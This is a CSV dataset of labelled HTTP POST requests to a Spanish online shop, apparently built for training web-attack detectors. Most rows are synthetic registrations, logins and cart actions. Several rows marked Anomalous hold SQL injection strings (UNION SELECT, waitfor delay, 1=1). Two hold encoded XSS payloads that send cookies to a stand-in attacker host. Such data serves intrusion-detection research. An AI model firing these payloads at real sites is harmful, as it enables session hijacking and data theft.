,Method,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Pragma,User-Agent,Content-Type,POST-Data,Request,Class
7550,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=crafton&password=p2_l5ote&nombreA=Peregrina&apellidos=Mengual+Bartumeu&email=feliciano%40atorre.mobi&dni=80328105F&direccion=Calle+Zurbaran%2C+131%2C+&ciudad=Busot&cp=48195&provincia=Sevilla&ntc=4168827609798795&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=crafton&password=p2_l5ote&nombrea=peregrina&apellidos=mengual+bartumeu&email=feliciano%40atorre.mobi&dni=80328105f&direccion=calle+zurbaran%2c+131%2c+&ciudad=busot&cp=48195&provincia=sevilla&ntc=4168827609798795&b1=registrar",Anomalous
15591,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=vowels&password=0lTi4aci%F30&nombre=Ronn&apellidos=Nav%EDo+Brosa&email=seay-roero%40salsaspain.cg&dni=00933575M&direccion=Pl.+Polo+139%2C+&ciudad=Almargen&cp=46300&provincia=Salamanca&ntc=3522819558732726&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=vowels&password=0lti4aci%f30&nombre=ronn&apellidos=nav%edo+brosa&email=seay-roero%40salsaspain.cg&dni=00933575m&direccion=pl.+polo+139%2c+&ciudad=almargen&cp=46300&provincia=salamanca&ntc=3522819558732726&b1=registrar",Valid
9252,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=visvanat&password=mohatrera&nombre=Helga&apellidos=Peratill&email=hauser%40whitepearlresort.as&dni=88363371Q&direccion=Calle+Sandoval+135%2C+4%3FB&ciudad=S%E1daba&cpA=40183&provincia=Zaragoza&ntc=6865627677043866&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=visvanat&password=mohatrera&nombre=helga&apellidos=peratill&email=hauser%40whitepearlresort.as&dni=88363371q&direccion=calle+sandoval+135%2c+4%3fb&ciudad=s%e1daba&cpa=40183&provincia=zaragoza&ntc=6865627677043866&b1=registrar",Anomalous
14158,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,B2=Vaciar+carrito,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedb2=vaciar+carrito",Valid
7255,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar&login=storm&pwdA=527aD2&remember=off&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar&login=storm&pwda=527ad2&remember=off&b1=entrar",Anomalous
9067,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=rozamond8&password=C9960lit5gR%E1F018&nombre=Higinia&apellidos=Luque+Pe%F1afiel&email=demunn-dantzer%40gafasdesol.nom.gn&dni=34990134G&direccion=Calle+Boch+122+&ciudad=Vega+de+Tirados&cp=03841&provinciaA=Badajoz&ntc=1250583387066531&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=rozamond8&password=c9960lit5gr%e1f018&nombre=higinia&apellidos=luque+pe%f1afiel&email=demunn-dantzer%40gafasdesol.nom.gn&dni=34990134g&direccion=calle+boch+122+&ciudad=vega+de+tirados&cp=03841&provinciaa=badajoz&ntc=1250583387066531&b1=registrar",Anomalous
11728,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=2&nombre=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=2&nombre=vino+rioja&precio=85&cantidad=76&b1=a%f1adir+al+carrito",Valid
164,POST,invalid,*/*,"iso-8859-1;q=0.8, windows-1254;q=0.9, iso-8859-3, windows-1253, iso-8859-7",non-standard,max-age=3,no-cache,Mozilla/9.9 (Windows; U; WinNT 7.4; sh-ko; rv:1.7.9) Gecko/45141253,application/x-www-form-urlencoded,mrEhymtos=3sefdt'  UNION   :/**/   SELECT  jtuhloru  FROM    dba_users    WHERE     Tdohl   like    '%25,"invalid*/*iso-8859-1;q=0.8, windows-1254;q=0.9, iso-8859-3, windows-1253, iso-8859-7non-standardmax-age=3no-cachemozilla/9.9 (windows; u; winnt 7.4; sh-ko; rv:1.7.9) gecko/45141253application/x-www-form-urlencodedmrehymtos=3sefdt'  union   :/**/   select  jtuhloru  from    dba_users    where     tdohl   like    '%25",Anomalous
1167,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,idA=1,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedida=1",Anomalous
15952,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=1&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=1&nombre=queso+manchego&precio=85&cantidad=9&b1=a%f1adir+al+carrito",Valid
4379,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=%3F&precio=794&B1=Pasar+por+caja,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=%3f&precio=794&b1=pasar+por+caja",Anomalous
6439,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=capes&password=desemperezar&nombre=Itallia&apellidos=Ayarza+Quintal&email=wei%40alfombra.com.gw&dni=82166751X&direccion=Llan%E7a+16+&ciudad=Torla&cp=31522&provincia=%3F&ntc=0723351625880614&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=capes&password=desemperezar&nombre=itallia&apellidos=ayarza+quintal&email=wei%40alfombra.com.gw&dni=82166751x&direccion=llan%e7a+16+&ciudad=torla&cp=31522&provincia=%3f&ntc=0723351625880614&b1=registrar",Anomalous
1013,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=2sessionid%3d12312312%26+username%3d%3cscript%3edocument.location%3d%27http%3a%2f%2fhacker+.example.com%2fcgi-bin%2fcookiesteal.cgi%3f%27%2b+document.cookie%3c%2fscript%3e",Anomalous
7202,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=mo%2Brson&password=c44dE96&nombre=Orestes&apellidos=Amargant&email=el2%40campanasextractoras.py&dni=57728968A&direccion=Calle+Salado%2C+148%2C+6%3FF&ciudad=Valderrobres&cp=16236&provincia=Girona&ntc=1272142225716686&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=mo%2brson&password=c44de96&nombre=orestes&apellidos=amargant&email=el2%40campanasextractoras.py&dni=57728968a&direccion=calle+salado%2c+148%2c+6%3ff&ciudad=valderrobres&cp=16236&provincia=girona&ntc=1272142225716686&b1=registrar",Anomalous
11498,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=2,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=2",Valid
4010,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar&login=jasver9%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=76r9v3t2&remember=off&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar&login=jasver9%27%29%3bwaitfor+delay+%270%3a0%3a15%27%3b--&pwd=76r9v3t2&remember=off&b1=entrar",Anomalous
8500,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=3&nombre=Vino+Rioja&precio=39&cantidad=34sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&B1=A%F1adir+al+carrito,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=3&nombre=vino+rioja&precio=39&cantidad=34sessionid%3d12312312%26+username%3d%253c%2573%2563%2572%2569%2570%2574%253e%2564%256f%2563%2575%256d%2565%256e%2574%252e%256c%256f%2563%2561%2574%2569%256f%256e%253d%2527%2568%2574%2574%2570%253a%252f%252f%2561%2574%2574%2561%2563%256b%2565%2572%2568%256f%2573%2574%252e%2565%2578%2561%256d%2570%256c%2565%252f%2563%2567%2569%252d%2562%2569%256e%252f%2563%256f%256f%256b%2569%2565%2573%2574%2565%2561%256c%252e%2563%2567%2569%253f%2527%252b%2564%256f%2563%2575%256d%2565%256e%2574%252e%2563%256f%256f%256b%2569%2565%253c%252f%2573+%2563%2572%2569%2570%2574%253e%3f&b1=a%f1adir+al+carrito",Anomalous
8494,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,B2=%22+AND+%221%22%3D%221,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedb2=%22+and+%221%22%3d%221",Anomalous
10357,POST,invalid,*/*,"iso-8859-9, x-mac-icelandic",*;q=0.2,no-transform,no-cache,invalid,application/x-www-form-urlencoded,lnntmxnn9E=iil7trIo&0nw119etDgeYt1=~&p1c=pbK5gHbPwse&elhnld=sotnriceEerse0wh&e3=172&pH.78=pd5hdeoL&B1ertbh=2&kkptlii=m1ce9Styh&iolskNntatt=83Pt&2ieihuaTaiIr3cs=u,"invalid*/*iso-8859-9, x-mac-icelandic*;q=0.2no-transformno-cacheinvalidapplication/x-www-form-urlencodedlnntmxnn9e=iil7trio&0nw119etdgeyt1=~&p1c=pbk5ghbpwse&elhnld=sotnriceeerse0wh&e3=172&ph.78=pd5hdeol&b1ertbh=2&kkptlii=m1ce9styh&iolsknntatt=83pt&2ieihuataiir3cs=u",Anomalous
9759,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=blinnie&password=8jengib%24r5&nombre=X%2Fi%27xia&apellidos=Sanfeliu+Maurici&email=cabrera_bowles%40alfombra.com.ge&dni=35993227K&direccion=Romero+De+Cordoba+65%2C+&ciudad=Cubla&cp=30890&provincia=Valencia&ntc=8073640518599358&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=blinnie&password=8jengib%24r5&nombre=x%2fi%27xia&apellidos=sanfeliu+maurici&email=cabrera_bowles%40alfombra.com.ge&dni=35993227k&direccion=romero+de+cordoba+65%2c+&ciudad=cubla&cp=30890&provincia=valencia&ntc=8073640518599358&b1=registrar",Anomalous
19393,POST,invalid,image/*,*;q=0.7,*,no-transform,invalid,Mozilla/2.2 (Windows; U; Win98 6.9; 0t-ix; rv:5.0.0) Gecko/73521785,application/x-www-form-urlencoded,ro=acrrh&ercaAgN6ssn=2o0Wn5QvAzAI,invalidimage/**;q=0.7*no-transforminvalidmozilla/2.2 (windows; u; win98 6.9; 0t-ix; rv:5.0.0) gecko/73521785application/x-www-form-urlencodedro=acrrh&ercaagn6ssn=2o0wn5qvazai,Valid
3182,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=insertar&precio=6493&B1=Pasar+por+caja%2F,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=insertar&precio=6493&b1=pasar+por+caja%2f",Anomalous
3849,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,B2=%7C,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedb2=%7c",Anomalous
13237,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=mccormac&password=narra&nombre=Selva&apellidos=Marti+Maragliano&email=defauce%40farma-job.ro&dni=32099761H&direccion=Claveles+44%2C+10D&ciudad=Valdeavellano&cp=24206&provincia=Lleida&ntc=1180738044092526&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=mccormac&password=narra&nombre=selva&apellidos=marti+maragliano&email=defauce%40farma-job.ro&dni=32099761h&direccion=claveles+44%2c+10d&ciudad=valdeavellano&cp=24206&provincia=lleida&ntc=1180738044092526&b1=registrar",Valid
14949,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=link&password=so212dor5&nombre=Lucario&apellidos=Di%E9guez+Urkijo&email=caven%40designworld.sr&dni=62330094W&direccion=Escritor+Alcala+Ya%F1ez+52+13-H&ciudad=Trabadelo&cp=34219&provincia=Salamanca&ntc=8525215482445798&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=link&password=so212dor5&nombre=lucario&apellidos=di%e9guez+urkijo&email=caven%40designworld.sr&dni=62330094w&direccion=escritor+alcala+ya%f1ez+52+13-h&ciudad=trabadelo&cp=34219&provincia=salamanca&ntc=8525215482445798&b1=registrar",Valid
13779,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,errorMsg=Credenciales+incorrectas,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodederrormsg=credenciales+incorrectas",Valid
14267,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,errorMsg=Credenciales+incorrectas,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodederrormsg=credenciales+incorrectas",Valid
